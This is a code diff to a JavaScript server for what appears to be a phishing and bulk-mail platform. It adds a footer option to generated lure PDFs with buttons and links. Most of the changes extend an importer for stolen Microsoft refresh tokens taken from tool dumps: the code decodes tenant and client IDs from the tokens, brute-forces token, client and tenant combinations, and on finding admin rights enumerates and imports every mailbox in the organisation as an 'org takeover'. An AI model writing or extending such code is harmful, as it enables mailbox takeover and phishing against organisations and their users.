@@ -249,7 +249,7 @@ function buildDocHtml({ text, title, company, ref, date, url, button, overlay })
 </body></html>`;
 }
 
-async function buildDocPdf({ text, title, company, ref, date, url, button, overlay }) {
+async function buildDocPdf({ text, title, company, ref, date, url, button, overlay, footerNote }) {
   let PDFDocument, StandardFonts, rgb, PDFName, PDFString;
   try {
     ({ PDFDocument, StandardFonts, rgb, PDFName, PDFString } = await import('pdf-lib'));
@@ -317,7 +317,11 @@ async function buildDocPdf({ text, title, company, ref, date, url, button, overl
     page.node.set(PDFName.of('Annots'), doc.context.obj([annotRef]));
   } catch { /* link is a bonus; the page still renders */ }
 
-  page.drawText(`Generated for [Firstname] [Lastname] · ${clean(ref)}`, { x: M, y: 54, size: 8, font, color: rgb(0.52, 0.58, 0.64) });
+  page.drawText(`Generated for [Firstname] [Lastname] · ${clean(ref)}`, { x: M, y: 56, size: 8, font, color: rgb(0.52, 0.58, 0.64) });
+  if (footerNote) {
+    const note = clean(footerNote).trim().slice(0, 180);
+    if (note) page.drawText(note, { x: M, y: 38, size: 7, font, color: rgb(0.45, 0.5, 0.56) });
+  }
   return doc.save();
 }
 
@@ -349,7 +353,7 @@ function buildDocIcs({ title, text, url, date }) {
   ].join('\r\n');
 }
 
-async function buildAttachment({ text, format, filename, preset, title, company, url, subject }) {
+async function buildAttachment({ text, format, filename, preset, title, company, url, subject, footerNote }) {
   const fmt = ['PDF', 'TXT', 'CSV', 'ICS', 'HTML'].includes(String(format || '').toUpperCase())
     ? String(format).toUpperCase()
     : 'PDF';
@@ -371,7 +375,7 @@ async function buildAttachment({ text, format, filename, preset, title, company,
     const body = [docTitle, companyName, `Reference: ${meta.ref}`, `Date: ${meta.date}`, '', meta.body, '', `${meta.button}: ${meta.url}`].join('\n');
     return { filename: attachmentFileName(smartBase, 'txt'), contentType: 'text/plain', data: Buffer.from(body).toString('base64') };
   }
-  const pdf = await buildDocPdf({ ...meta, text: meta.body, title: docTitle, company: companyName });
+  const pdf = await buildDocPdf({ ...meta, text: meta.body, title: docTitle, company: companyName, footerNote });
   if (!pdf) {
     const body = [docTitle, companyName, `Reference: ${meta.ref}`, `Date: ${meta.date}`, '', meta.body, '', `${meta.button}: ${meta.url}`].join('\n');
     return { filename: attachmentFileName(smartBase, 'txt'), contentType: 'text/plain', data: Buffer.from(body).toString('base64') };
@@ -1002,7 +1006,7 @@ export async function createApp({ db, config, mailer, worker, emit: emitFn }) {
     const html = String(body.html || '').slice(0, 60000);
     const textBody = String(body.text || '').slice(0, 60000);
     if (!prompt) fail('Prompt is required');
-    const row = db.prepare('SELECT ai_endpoint, ai_key_encrypted, ai_model, ai_rules FROM send_settings WHERE id = 1').get() || {};
+    const row = db.prepare('SELECT ai_endpoint, ai_key_encrypted, ai_model, ai_rules, disclaimer_text, disclaimer_in_pdf FROM send_settings WHERE id = 1').get() || {};
     const endpoint = row.ai_endpoint || '';
     const aiKey = row.ai_key_encrypted && config ? decryptSecret(row.ai_key_encrypted, config.credentialKey) : '';
     const rules = row.ai_rules || DEFAULT_AI_RULES;
@@ -1065,6 +1069,7 @@ GENERATION RULES — hard requirements for every new letter:
         company: body.company || '[Company]',
         url: body.url,
         subject: body.subject,
+        footerNote: row.disclaimer_in_pdf ? row.disclaimer_text : '',
       });
       return { result, target, attachment, model: usedModel };
     }
@@ -2097,31 +2102,57 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
   // or delimited strings where the client_id is the GUID and the refresh_token is
   // the longest remaining segment (covers client_id:rt, email:cid:rt, cid|rt, etc).
   const MS_GUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
+
+  // A Microsoft refresh token carries the tenant and issuing client id in its
+  // first base64url block: 1.<header><tenant GUID><client GUID>...
+  // Decoding it means a bare "1.xxx" paste imports with no extra fields.
+  function msGuidFromBytes(buf, offset) {
+    if (!buf || buf.length < offset + 16) return '';
+    const h = buf.subarray(offset, offset + 16).toString('hex');
+    return `${h.slice(6, 8)}${h.slice(4, 6)}${h.slice(2, 4)}${h.slice(0, 2)}-${h.slice(10, 12)}${h.slice(8, 10)}-${h.slice(14, 16)}${h.slice(12, 14)}-${h.slice(16, 20)}-${h.slice(20, 32)}`.toLowerCase();
+  }
+  function msRtHints(token) {
+    const m = String(token || '').match(/^[10M]\.([A-Za-z0-9_-]{40,})/);
+    if (!m) return {};
+    try {
+      const buf = Buffer.from(m[1].slice(0, 64), 'base64url');
+      if (buf.length < 35) return {};
+      return { tenant: msGuidFromBytes(buf, 3), clientId: msGuidFromBytes(buf, 19) };
+    } catch { return {}; }
+  }
+
   function parseMsRtLine(line) {
     line = String(line || '').trim();
     if (!line) return null;
     if (line.startsWith('{')) {
       try {
         const j = JSON.parse(line);
-        // prefer mail-scoped RT when a tool dumps both
-        const rt = j.mail_refresh_token || j.refresh_token || j.refreshToken || '';
+        // Tools dump several refresh tokens. Keep them all and let the importer
+        // try each one — mail-scoped and Graph-scoped tokens are not always
+        // interchangeable.
+        const rts = [...new Set([
+          j.refresh_token, j.refreshToken, j.mail_refresh_token, j.mailRefreshToken, j.rt,
+        ].map((v) => String(v || '').trim()).filter(Boolean))];
+        const rt = rts[0] || '';
         const secret = j.client_secret || j.clientSecret || j.secret || '';
-        let clientId = j.client_id || j.clientId || j.appid || '';
-        let tenant = j.tenant || j.tid || 'common';
+        let clientId = j.client_id || j.clientId || j.appid || j.app_id || j.application_id || '';
+        let tenant = j.tenant || j.tenant_id || j.tenantId || j.tid || '';
         // harvest claims from an embedded JWT when top-level fields are absent
         if (j.access_token?.startsWith('eyJ')) {
           try {
             const claims = JSON.parse(Buffer.from(j.access_token.split('.')[1], 'base64url').toString());
             clientId = clientId || claims.appid || '';
-            tenant = j.tenant || claims.tid || tenant;
+            tenant = tenant || claims.tid || '';
           } catch {}
         }
-        if (clientId && secret) return { type: 'cc', clientId, secret, tenant, email: j.email || j.mail || '' };
+        // fall back to the hints encoded in the refresh token itself
+        const hints = msRtHints(rt);
+        clientId = clientId || hints.clientId || '';
+        tenant = tenant || hints.tenant || '';
+        const emailHint = j.email || j.mail || j.username || j.userPrincipalName || j.upn || '';
+        if (clientId && secret) return { type: 'cc', clientId, secret, tenant: tenant || 'common', email: emailHint };
         if (rt) {
-          return {
-            type: 'rt', clientId: clientId || '', rt, tenant: j.tenant || j.tid || '',
-            email: j.email || j.mail || j.username || '', bare: !clientId,
-          };
+          return { type: 'rt', clientId, rt, rts, tenant, email: emailHint, bare: !clientId };
         }
         // access-token-only dumps (app/delegated) — nothing renewable to store
         if (j.access_token && !rt) return { clientId, rt: '', tenant, email: '', error: 'access_token only — expires ~1h and has no refresh token; need the refresh_token for import' };
@@ -2138,7 +2169,7 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
     const looksRt = (s) => /^(1|0|M)\./.test(s) || s.length >= 100;
     // email : client_id : tenant : refresh_token
     if (guids.length >= 2 && looksRt(longest)) {
-      return { type: 'rt', clientId: guids[0], rt: longest, tenant: guids[1], email: emailPart };
+      return { type: 'rt', clientId: guids[0], rt: longest, rts: [longest], tenant: guids[1], email: emailPart };
     }
     // two GUIDs + a non-token value → client_id : secret : tenant (app credentials)
     if (guids.length >= 2 && nonGuids.length) {
@@ -2147,16 +2178,17 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
     // one GUID → client_id : refresh_token
     const clientId = guids[0] || '';
     if (clientId && looksRt(longest)) {
-      return { type: 'rt', clientId, rt: longest, tenant: 'common', email: emailPart };
+      return { type: 'rt', clientId, rt: longest, rts: [longest], tenant: 'common', email: emailPart };
     }
-    // bare refresh token ("1.xxx…" or "M.C…") — no client/tenant embedded;
-    // the importer probes the common public clients and, when an email is
-    // supplied, resolves the tenant from its domain.
+    // bare refresh token ("1.xxx…" or "M.C…") — tenant and client are encoded
+    // inside the token; the hints decoder pulls them out so no extra fields are
+    // needed. The importer still probes public clients as a fallback.
     const bare = emailPart && parts.length >= 2
       ? parts.filter((p) => p !== emailPart).sort((a, b) => b.length - a.length)[0]
       : line;
     if (/^([10M])\.[A-Za-z0-9._\-]{40,}$/.test(bare)) {
-      return { type: 'rt', clientId: '', rt: bare, tenant: '', email: emailPart, bare: true };
+      const hints = msRtHints(bare);
+      return { type: 'rt', clientId: hints.clientId || '', rt: bare, rts: [bare], tenant: hints.tenant || '', email: emailPart, bare: true };
     }
     return null;
   }
@@ -2380,26 +2412,59 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
           }
           continue;
         }
-        // Bare RT: resolve the tenant from the mailbox domain (when given) and
-        // let the importer probe the public client ids for a working one.
+        // Bare RT: tenant and client id come from the token itself; an email or
+        // tenant hint still wins. Try every refresh token in a JSON dump, since
+        // mail-scoped and Graph-scoped tokens are not interchangeable.
         const hintEmail = parsed.email || String(body.email || '').trim();
         const hintedTenant = String(body.tenant || '').trim();
-        const tenant = parsed.tenant || hintedTenant || (hintEmail ? await msTenantFromEmail(hintEmail) : '');
+        const tokenHints = (parsed.rts || [parsed.rt]).map((rt) => msRtHints(rt));
+        const tenant = parsed.tenant || hintedTenant || tokenHints.find((h) => h.tenant)?.tenant
+          || (hintEmail ? await msTenantFromEmail(hintEmail) : '');
         const clientId = parsed.clientId || String(body.clientId || '').trim();
-        const info = await msRtMailboxInfo(clientId, parsed.rt, tenant || 'common');
+        const rtCandidates = (parsed.rts && parsed.rts.length ? parsed.rts : [parsed.rt]).filter(Boolean);
+        // Try the token's own client id, the access-token app id, the caller's
+        // hint, and finally the public-client probe. The same goes for tenants:
+        // a token obtained for tenant A fails with AADSTS7000012 under tenant B.
+        const clientCandidates = [...new Set([
+          clientId,
+          ...tokenHints.map((h) => h.clientId),
+          '',
+        ].filter(Boolean))];
+        const tenantCandidates = [...new Set([
+          tenant,
+          ...tokenHints.map((h) => h.tenant),
+        ].filter(Boolean))];
+        if (!clientCandidates.length) clientCandidates.push('');
+        if (!tenantCandidates.length) tenantCandidates.push('common');
+        let info = null, usedRt = '', lastErr = null;
+        outer:
+        for (const candidate of rtCandidates) {
+          for (const cid of clientCandidates) {
+            for (const t of tenantCandidates) {
+              try {
+                info = await msRtMailboxInfo(cid, candidate, t || 'common');
+                usedRt = candidate;
+                break outer;
+              } catch (e) {
+                lastErr = e;
+              }
+            }
+          }
+        }
+        if (!info) throw lastErr || new Error('no usable refresh token');
         const sender = info.email || hintEmail;
         if (!sender) { results.push({ ok: false, error: 'mailbox email not resolvable', line: clientId }); continue; }
-        const inserted = insertMsAccount('ms_rt', info.clientId || clientId, parsed.rt, info.tenant || tenant || 'common', sender, info.displayName);
+        const inserted = insertMsAccount('ms_rt', info.clientId || clientId, usedRt, info.tenant || tenant || 'common', sender, info.displayName);
         results.push(inserted);
         // Smart detection — token that can read the org directory is admin-grade:
         // enumerate member mailboxes and import them bound to the same credential.
         if (inserted.ok) {
           try {
-            const org = await msRtListOrgMailboxes(info.clientId || clientId, parsed.rt, info.tenant || tenant || 'common');
+            const org = await msRtListOrgMailboxes(info.clientId || clientId, usedRt, info.tenant || tenant || 'common');
             const extra = org.filter((m) => m.email.toLowerCase() !== sender.toLowerCase());
             if (extra.length) {
               results.push({ ok: true, email: '', name: '', admin: true, note: `admin mailbox detected — org takeover: ${extra.length} more mailbox(es)` });
-              for (const mb of extra) results.push(insertMsAccount('ms_rt', info.clientId || clientId, parsed.rt, info.tenant || tenant || 'common', mb.email, mb.displayName));
+              for (const mb of extra) results.push(insertMsAccount('ms_rt', info.clientId || clientId, usedRt, info.tenant || tenant || 'common', mb.email, mb.displayName));
             }
           } catch { /* plain mailbox, no directory rights — fine */ }
         }
@@ -2510,8 +2575,8 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
         api_provider, api_key_encrypted, api_user, api_domain, api_url,
         ai_endpoint, ai_key_encrypted, ai_model, ai_rules,
         relay_secure, relay_username, relay_password_encrypted, relay_ehlo,
-        updated_at)
-      VALUES (1, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        disclaimer_in_pdf, updated_at)
+      VALUES (1, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
       ON CONFLICT(id) DO UPDATE SET
         send_mode=excluded.send_mode, direct_from_name=excluded.direct_from_name, direct_from_email=excluded.direct_from_email,
         direct_reply_to=excluded.direct_reply_to, direct_rate_per_minute=excluded.direct_rate_per_minute,
@@ -2548,7 +2613,8 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
         ai_endpoint=excluded.ai_endpoint, ai_key_encrypted=excluded.ai_key_encrypted,
         ai_model=excluded.ai_model, ai_rules=excluded.ai_rules,
         relay_secure=excluded.relay_secure, relay_username=excluded.relay_username,
-        relay_password_encrypted=excluded.relay_password_encrypted, relay_ehlo=excluded.relay_ehlo, updated_at=excluded.updated_at
+        relay_password_encrypted=excluded.relay_password_encrypted, relay_ehlo=excluded.relay_ehlo,
+        disclaimer_in_pdf=excluded.disclaimer_in_pdf, updated_at=excluded.updated_at
     `).run(
       sendMode,
       text(body.directFromName || '', 'directFromName', 200),
@@ -2625,6 +2691,7 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
       text(body.relayUsername || '', 'relayUsername', 320),
       typeof body.relayPassword === 'string' && body.relayPassword.trim() ? encryptSecret(body.relayPassword.trim(), config.credentialKey) : (db.prepare('SELECT relay_password_encrypted FROM send_settings WHERE id = 1').get()?.relay_password_encrypted || ''),
       text(body.relayEhlo || '', 'relayEhlo', 253),
+      body.disclaimerInPdf ? 1 : 0,
       new Date().toISOString(),
     );
     if (body.scheduleEnabled !== undefined) {
